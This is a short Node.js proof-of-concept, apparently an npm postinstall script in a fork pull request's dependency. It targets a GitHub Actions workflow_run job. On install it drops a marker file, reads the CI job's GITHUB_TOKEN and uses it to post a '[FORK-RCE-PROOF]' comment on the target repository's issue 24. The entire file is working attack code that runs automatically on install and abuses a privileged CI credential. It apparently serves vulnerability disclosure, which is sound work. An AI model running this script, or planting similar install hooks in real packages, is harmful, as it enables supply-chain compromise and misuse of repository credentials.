const fs = require('fs');
fs.writeFileSync('/tmp/ADP_FORK_MARKER', 'fork-dep-postinstall-ran');
(async () => {
  try {
    const repo = process.env.GITHUB_REPOSITORY;
    const headers = {
      authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
      accept: 'application/vnd.github+json',
      'user-agent': 'poc'
    };
    const c = await fetch(`https://api.github.com/repos/${repo}/issues/24/comments`, {
      method: 'POST', headers,
      body: JSON.stringify({ body: '[FORK-RCE-PROOF] npm postinstall executed in workflow_run job triggered by a FORK pull request; job token has pull-requests:write.' })
    });
    console.log('FORK_COMMENT_STATUS=' + c.status);
  } catch (e) { console.log('ERR=' + e.message); }
})();
